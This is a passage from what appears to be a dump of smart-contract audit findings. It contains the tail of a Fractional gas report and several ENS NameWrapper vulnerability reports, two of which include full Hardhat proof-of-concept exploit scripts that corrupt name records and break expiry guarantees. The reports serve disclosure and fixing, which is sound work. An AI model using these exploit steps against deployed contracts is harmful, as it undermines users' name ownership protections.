2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 64):            `for (uint256 i = 0; i < _tokens.length; ) {`                  2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 83):            `for (uint256 i = 0; i < _tokens.length; ) {`        3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`      #  [G-08] `require()` or `revert()` statements that check input arguments should be at the top of the function:-         1. File: 2022-07-fractional/src/FERC1155.sol (line 297):            `require(metadata[_id] != address(0), \"NO METADATA\");`                  2. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 62):            `require(_data.length > 1, \"wont generate root for single leaf\");`        3. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, \"wont generate proof for single leaf\");`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`                  #  [G-09] Use a more recent version of solidity:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 2):            `pragma solidity 0.8.13;`        2. File: 2022-07-fractional/src/Vault.sol (line 2):            `pragma solidity 0.8.13;`                  3. File: 2022-07-fractional/src/VaultFactory.sol (line 2):            `pragma solidity 0.8.13;`        4. File: 2022-07-fractional/src/VaultRegistry.sol (line 2):            `pragma solidity 0.8.13;`                  5. File: 2022-07-fractional/src/constants/Memory.sol (line 2):            `pragma solidity 0.8.13;`        6. File: 2022-07-fractional/src/constants/Permit.sol (line 2):            `pragma solidity 0.8.13;`        7. File: 2022-07-fractional/src/constants/Supply.sol(line 2):            `pragma solidity 0.8.13;`         8. File: 2022-07-fractional/src/constants/Transfer.sol (line 2):            `pragma solidity 0.8.13;`        9. File: 2022-07-fractional/src/interfaces/IBaseVault.sol (line 2):            `pragma solidity 0.8.13;`                  10. File: 2022-07-fractional/src/interfaces/IBuyout.sol (line 2):            `pragma solidity 0.8.13;`        11. File: 2022-07-fractional/src/interfaces/IERC1155.sol (line 2):            `pragma solidity 0.8.13;`                  12. File: 2022-07-fractional/src/interfaces/IERC20.sol(line 2):            `pragma solidity 0.8.13;`         13. File: 2022-07-fractional/src/interfaces/IERC721.sol (line 2):            `pragma solidity 0.8.13;`        14. File: 2022-07-fractional/src/interfaces/IFERC1155.sol (line 2):            `pragma solidity 0.8.13;`        15. File: 2022-07-fractional/src/interfaces/IMigration.sol (line 2):            `pragma solidity 0.8.13;`                  16. File: 2022-07-fractional/src/interfaces/IMinter.sol (line 2):            `pragma solidity 0.8.13;`        17. File: 2022-07-fractional/src/interfaces/IModule.sol (line 2):            `pragma solidity 0.8.13;`                  18. File: 2022-07-fractional/src/interfaces/INFTReceiver.sol (line 2):            `pragma solidity 0.8.13;`        19. File: 2022-07-fractional/src/interfaces/IProtoform.sol (line 2):            `pragma solidity 0.8.13;`        20. File: 2022-07-fractional/src/interfaces/ISupply.sol (line 2):            `pragma solidity 0.8.13;`         21. File: 2022-07-fractional/src/interfaces/ITransfer.sol (line 2):            `pragma solidity 0.8.13;`        22. File: 2022-07-fractional/src/interfaces/IVault.sol (line 2):            `pragma solidity 0.8.13;`                  23. File: 2022-07-fractional/src/interfaces/IVaultFactory.sol (line 2):            `pragma solidity 0.8.13;`        24. File: 2022-07-fractional/src/interfaces/IVaultRegistry.sol (line 2):            `pragma solidity 0.8.13;`                  25. File: 2022-07-fractional/src/modules/Buyout.sol (line 2):            `pragma solidity 0.8.13;`        26. File: 2022-07-fractional/src/modules/Migration.sol (line 2):            `pragma solidity 0.8.13;`        27. File: 2022-07-fractional/src/modules/Minter.sol (line 2):            `pragma solidity 0.8.13;`        28. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 2):            `pragma solidity 0.8.13;`                  29. File: 2022-07-fractional/src/references/SupplyReference.sol (line 2):            `pragma solidity 0.8.13;`        30. File: 2022-07-fractional/src/references/TransferReference.sol (line 2):            `pragma solidity 0.8.13;`                  31. File: 2022-07-fractional/src/targets/Supply.sol (line 2):            `pragma solidity 0.8.13;`        32. File: 2022-07-fractional/src/targets/Transfer.sol (line 2):            `pragma solidity 0.8.13;`        33. 2022-07-fractional/src/utils/MerkleBase.sol (line 2):            `pragma solidity 0.8.13;`         34. File: 2022-07-fractional/src/utils/Metadata.sol (line 2):            `pragma solidity 0.8.13;`        35. File: 2022-07-fractional/src/utils/Multicall.sol (line 2):            `pragma solidity 0.8.13;`                  36. File: 2022-07-fractional/src/utils/SafeSend.sol (line 2):            `pragma solidity 0.8.13;`        36. File: 2022-07-fractional/src/utils/SelfPermit.sol (line 2):            `pragma solidity 0.8.13;`                 #  [G-10] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate {Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot} :-        1. File: 2022-07-fractional/src/FERC1155.sol (line 25-34):            `    /// @notice Mapping of metadata contracts for token ID types => metadata address     mapping(uint256 => address) public metadata;     /// @notice Mapping to track account nonces for metadata txs owner => nonces     mapping(address => uint256) public nonces;     /// @notice Mapping to track total supply for token ID types => totalSupply     mapping(uint256 => uint256) public totalSupply;     /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress     mapping(uint256 => address) private royaltyAddress;     /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent     mapping(uint256 => uint256) private royaltyPercent;`    #  [G-11] Empty blocks should be removed or emit something:-        1. File: 2022-07-fractional/src/Vault.sol (line 32):            `preceive() external payable {}`        2. File: 2022-07-fractional/src/modules/Buyout.sol (line 53):            `receive() external payable {}`                  3. File: 2022-07-fractional/src/modules/Migration.sol (line 63):            `receive() external payable {}`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 8):            `constructor() {}`              #  [G-12] Use custom errors rather than revert()/require() strings to save deployment gas:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 263):            `require(             msg.sender == _from ||                 isApprovedForAll[_from][msg.sender] ||                 isApproved[_from][msg.sender][_id],             \"NOT_AUTHORIZED\"         );`        2. File: 2022-07-fractional/src/FERC1155.sol (line 275):            `require(             _to.code.length == 0                 ? _to != address(0)                 : INFTReceiver(_to).onERC1155Received(                     msg.sender,                     _from,                     _id,                     _amount,                     _data                 ) == INFTReceiver.onERC1155Received.selector,             \"UNSAFE_RECIPIENT\"         );`                  3. File: 2022-07-fractional/src/FERC1155.sol (line 297):            `require(metadata[_id] != address(0), \"NO METADATA\");`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 62):            `require(_data.length > 1, \"wont generate root for single leaf\");`                            5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, \"wont generate proof for single leaf\");`                                                    #  [G-13] Functions guaranteed to revert when called by normal users can be marked payable (If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.):-        1. File: 2022-07-fractional/src/FERC1155.sol (line 37-50):            `   modifier onlyController() {         address controller_ = controller();         if (msg.sender != controller_)             revert InvalidSender(controller_, msg.sender);         _;     }      /// @notice Modifier for restricting function calls to the VaultRegistry     modifier onlyRegistry() {         address vaultRegistry = VAULT_REGISTRY();         if (msg.sender != vaultRegistry)             revert InvalidSender(vaultRegistry, msg.sender);         _;     }`        2. File: 2022-07-fractional/src/FERC1155.sol (line 56-63):            `function burn(         address _from,         uint256 _id,         uint256 _amount     ) external onlyRegistry {         _burn(_from, _id, _amount);         totalSupply[_id] -= _amount;     }`                  3. File: 2022-07-fractional/src/FERC1155.sol (line 79-87):            `function mint(         address _to,         uint256 _id,         uint256 _amount,         bytes memory _data     ) external onlyRegistry {         _mint(_to, _id, _amount, _data);         totalSupply[_id] += _amount;     }`        4. File: 2022-07-fractional/src/FERC1155.sol (line 198-232):            `function setContractURI(string calldata _uri) external onlyController {         contractURI = _uri;     }      /// @notice Sets the token metadata contract     /// @param _metadata Address for metadata contract     /// @param _id Token ID to set the metadata for     function setMetadata(address _metadata, uint256 _id)         external         onlyController     {         metadata[_id] = _metadata;         emit SetMetadata(_metadata, _id);     }      /// @notice Sets the token royalties     /// @param _id Token ID royalties are being updated for     /// @param _receiver Address to receive royalties     /// @param _percentage Percentage of royalties on secondary sales     function setRoyalties(         uint256 _id,         address _receiver,         uint256 _percentage     ) external onlyController {         royaltyAddress[_id] = _receiver;         royaltyPercent[_id] = _percentage;         emit SetRoyalty(_receiver, _id, _percentage);     }      /// @notice Updates the controller address for the FERC1155 token contract     /// @param _newController Address of new controlling entity     function transferController(address _newController)         external         onlyController     {`                      "}, {"title": "[PNM-003] The preimage DB (i.e., `NameWrapper.names`) can be maliciously manipulated/corrupted", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/197", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L520   # Vulnerability details  ### Description  By design, the `NameWrapper.names` is used as a preimage DB so that the client can query the domain name by providing the token ID. The name should be correctly stored. To do so, the `NameWrapper` record the domain's name every time it gets wrapped. And as long as all the parent nodes are recorded in the DB, wrapping a child node will be very efficient by simply querying the parent node's name.  However, within a malicious scenario, it is possible that a subdomain can be wrapped without recording its info in the preimage DB.  Specifically, when `NameWrappper.setSubnodeOwner` / `NameWrappper.setSubnodeRecord` on a given subdomain, the following code is used to check whether the subdomain is wrapped or not. The preimage DB is only updated when the subdomain is not wrapped (to save gas I beieve).  ```solidity= function setSubnodeOwner(     bytes32 parentNode,     string calldata label,     address newOwner,     uint32 fuses,     uint64 expiry )     public     onlyTokenOwner(parentNode)     canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))     returns (bytes32 node) {     bytes32 labelhash = keccak256(bytes(label));     node = _makeNode(parentNode, labelhash);     (, , expiry) = _getDataAndNormaliseExpiry(parentNode, node, expiry);     if (ens.owner(node) != address(this)) {         ens.setSubnodeOwner(parentNode, labelhash, address(this));         _addLabelAndWrap(parentNode, node, label, newOwner, fuses, expiry);     } else {         _transferAndBurnFuses(node, newOwner, fuses, expiry);     } } ```  However, the problem is that `ens.owner(node) != address(this)` is not sufficient to check whether the node is alreay wrapped. The hacker can manipulate this check by simply invoking `EnsRegistry.setSubnodeOwner` to set the owner as the `NameWrapper` contract without wrapping the node.  Consider the following attack scenario.  + the hacker registers a 2LD domain, e.g., `base.eth` + he assigns a subdomain for himself, e.g., `sub1.base.eth`      + the expiry of `sub1.base.eth` should be set as expired shortly      + note that the expiry is for `sub1.base.eth` instead of `base.eth`, so it is safe to make it soonly expired + the hacker waits for expiration and unwraps his `sub1.base.eth` + the hacker invokes `ens.setSubnodeOwner` to set the owner of `sub2.sub1.base.eth` as NameWrapper contract + the hacker re-wraps his `sub1.base.eth` + the hacker invokes `nameWrapper.setSubnodeOwner` for `sub2.sub1.base.eth`      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty  + the hacker invokes `nameWrapper.setSubnodeOwner` for `eth.sub2.sub1.base.eth`.      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes `\\x03eth`  It is not rated as a High issue since the forged name is not valid, i.e., without the tailed `\\x00` (note that a valid name should be like `\\x03eth\\x00`). However, the preimage BD can still be corrupted due to this issue.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  When wrapping node `X`, check whether `NameWrapper.names[X]` is empty directly, and update the preimage DB if it is empty.  ### PoC / Attack Scenario  There is a PoC file named `poc3.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc3.js ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { evm } = require('../test-utils') const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 3', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('name of a subdomain can be forged', () => {     /*      * Attack scenario:      * 1. the hacker registers a 2LD domain, e.g., base.eth      *      * 2. he assigns a subdomain for himself, e.g., sub1.base.eth      *      + the expiry of sub1.base.eth should be set as expired shortly      *      + note that the expiry is for sub1.base.eth not base.eth, so it is safe to make it soonly expired      *      * 3. the hacker waits for expiration and unwraps his sub1.base.eth      *      * 4. the hacker invokes ens.setSubnodeOwner to set the owner of sub2.sub1.base.eth as NameWrapper contract      *      * 5. the hacker re-wraps his sub1.base.eth      *      * 6. the hacker invokes nameWrapper.setSubnodeOwner for sub2.sub1.base.eth      *      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty      *      * 7. the hacker invokes nameWrapper.setSubnodeOwner for eht.sub2.sub1.base.eth.      *      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes \\03eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // registers a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // signed a submomain for the hacker, with a soon-expired expiry       const sub1Label = 'sub1'       const sub1LabelHash = labelhash(sub1Label)       const sub1Domain = sub1Label + '.' + label + '.eth'  // sub1.base.eth       const wrappedSub1TokenId = namehash(sub1Domain)       const block = await provider.getBlock(await provider.getBlockNumber())       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         sub1Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         block.timestamp + 3600 // soonly expired       )       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSub1TokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)        // the hacker unwraps his wrappedSubTokenId       await evm.advanceTime(7200)       await NameWrapperH.unwrap(wrappedTokenId, sub1LabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSub2TokenId as NameWrapper       const sub2Label = 'sub2'       const sub2LabelHash = labelhash(sub2Label)       const sub2Domain = sub2Label + '.' + sub1Domain // sub2.sub1.base.eth       const wrappedSub2TokenId = namehash(sub2Domain)       await EnsRegistryH.setSubnodeOwner(           wrappedSub1TokenId,           sub2LabelHash,           NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedSub2TokenId)).to.equal(           NameWrapper.address       )        // the hacker re-wraps the sub1node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(sub1Domain), hacker, EMPTY_ADDRESS)       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)        // the hackers setSubnodeOwner       // XXX: till now, the hacker gets sub2Domain with no name in Namewrapper       await NameWrapperH.setSubnodeOwner(         wrappedSub1TokenId,         sub2Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub2TokenId)).to.equal(hacker)       expect(await NameWrapper.names(wrappedSub2TokenId)).to.equal('0x')        // the hacker forge a fake root node       const sub3Label = 'eth'       const sub3LabelHash = labelhash(sub3Label)       const sub3Domain = sub3Label + '.' + sub2Domain // eth.sub2.sub1.base.eth       const wrappedSub3TokenId = namehash(sub3Domain)       await NameWrapperH.setSubnodeOwner(         wrappedSub2TokenId,         sub3Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub3TokenId)).to.equal(hacker)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: names[wrappedSub3TokenId] becomes `\\x03eth`       expect(await NameWrapper.names(wrappedSub3TokenId)).to.equal('0x03657468') // \\03eth     })   }) }) ```  "}, {"title": "[PNM-002] The expiry of the parent node can be smaller than the one of a child node, violating the guarantee policy", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/187", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L504 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356   # Vulnerability details  ### Description  By design, the child node's expiry can only be extended up to the parent's current one. Adding these restrictions means that the ENS users only have to look at the name itself's fuses and expiry (without traversing the hierarchy) to understand what guarantees the users have.  When a parent node tries to `setSubnodeOwner` / `setSubnodeRecord`, the following code is used to guarantee that the new expiry can only be extended up to the current one.  ```solidity= function _getDataAndNormaliseExpiry(     bytes32 parentNode,     bytes32 node,     uint64 expiry )     internal     view     returns (         address owner,         uint32 fuses,         uint64     ) {     uint64 oldExpiry;     (owner, fuses, oldExpiry) = getData(uint256(node));     (, , uint64 maxExpiry) = getData(uint256(parentNode));     expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);     return (owner, fuses, expiry); } ```  However, the problem shows when   + The sub-domain (e.g., `sub1.base.eth`) has its own sub-sub-domain (e.g., `sub2.sub1.base.eth`) + The sub-domain is unwrapped later, and thus its `oldExpiry` becomes zero. + When `base.eth` calls `NameWrapper.setSubnodeOwner`, there is not constraint of `sub1.base.eth`'s expiry, since `oldExpiry == 0`. As a result, the new expiry of `sub1.base.eth` can be arbitrary and smaller than the one of `sub2.sub1.base.eth`  The point here is that the `oldExpiry` will be set as 0 when unwrapping the node even it holds child nodes, relaxing the constraint.  Specifically, considering the following scenario  + The hacker owns a domain (or a 2LD), e.g., `base.eth` + The hacker assigns a sub-domain to himself, e.g., `sub1.base.eth`     + The expiry should be as large as possible + Hacker assigns a sub-sub-domain, e.g., `sub2.sub1.base.eth`     + The expiry should be as large as possible + The hacker unwraps his sub-domain, i.e., `sub1.base.eth` + The hacker re-wraps his sub-domain via `NameWrapper.setSubnodeOwner`     + The expiry can be small than the one of sub2.sub1.base.eth      The root cause _seems_ that we should not zero out the expiry when burning a node if the node holds any subnode.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: force the parent to have `CANNOT_UNWRAP` burnt if they want to set expiries on a child via `setSubnodeOwner` / `setSubnodeRecord` / `setChildFuses`  ### PoC / Attack Scenario  There is a PoC file named `poc5.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc5.js  ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 5', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + The hacker owns a domain (or a 2LD), e.g., base.eth      *  + The hacker assigns a sub-domain to himself, e.g., sub1.base.eth      *      + The expiry should be as large as possible      *  + Hacker assigns a sub-sub-domain, e.g., sub2.sub1.base.eth      *      + The expiry should be as large as possible      *  + The hacker unwraps his sub-domain, i.e., sub1.base.eth      *  + The hacker re-wraps his sub-domain, i.e., sub1.base.eth      *      + The expiry can be small than the one of sub2.sub1.base.eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       const block = await provider.getBlock(await provider.getBlockNumber())       const expiry = block.timestamp + 86400       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedTokenId))[1]       ).to.equal(expiry)        // assign a submomain       const subLabel = 'sub1'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[1]       ).to.equal(expiry)        // assign a subsubmomain       const subSubLabel = 'sub2'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       ).to.equal(expiry)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap his wrappedSubTokenId by NameWrapper.setSubnodeOwner       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         expiry - 7200       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: the expiry of sub1.base.eth is smaller than the one of sub2.sub1.base.eth       const sub1_expiry = (await NameWrapper.getFuses(wrappedSubTokenId))[1]       const sub2_expiry = (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       console.log('sub1 expiry:', sub1_expiry)       console.log('sub2 expiry:', sub2_expiry)       expect(sub1_expiry.toNumber()).to.be.lessThan(sub2_expiry.toNumber())     })   }) }) ```  "}, {"title": "ERC1155Fuse: `_transfer` does not revert when sent to the old owner", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/179", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284   # Vulnerability details  ## Impact  MED - the function of the protocol could be impacted  The `safeTransferFrom` does not comply with the ERC1155 standard when the token is sent to the old owner.  ## Proof of Concept  According to the EIP-1155 standard for the `safeTransferFrom`:  > MUST revert if balance of holder for token `_id` is lower than the `_value` sent.   Let's say `alice` does not hold any token of `tokenId`, and `bob` holds one token of `tokenId`. Then alice tries to send one token of `tokenId` to bob with `safeTranferFrom(alice, bob, tokenId, 1, \"\")`.  In this case, even though alice's balance (= 0) is lower than the amount (= 1) sent, the `safeTransferFrom` will not revert. Thus, violating the EIP-1155 standard. It can cause problems for other contracts using this token, since they assume the token was transferred if the `safeTransferFrom` does not revert. However, in the example above, no token was actually transferred.  ```solidity // https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284 // wrapper/ERC1155Fuse.sol::_transfer // ERC1155Fuse::safeTransferFrom uses _transfer  274     function _transfer( 275         address from, 276         address to, 277         uint256 id, 278         uint256 amount, 279         bytes memory data 280     ) internal { 281         (address oldOwner, uint32 fuses, uint64 expiry) = getData(id); 282         if (oldOwner == to) { 283             return; 284         } ```  ## Tools Used  none  ## Recommended Mitigation Steps  Revert even if the `to` address already owns the token.    "}, {"title": "[PNM-001] `PARENT_CANNOT_CONTROL` can be bypassed by maliciously unwrapping parent node", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/173", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L295 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ENSRegistry.sol#L74   # Vulnerability details  ### Description  By design, for any subdomain, as long as its 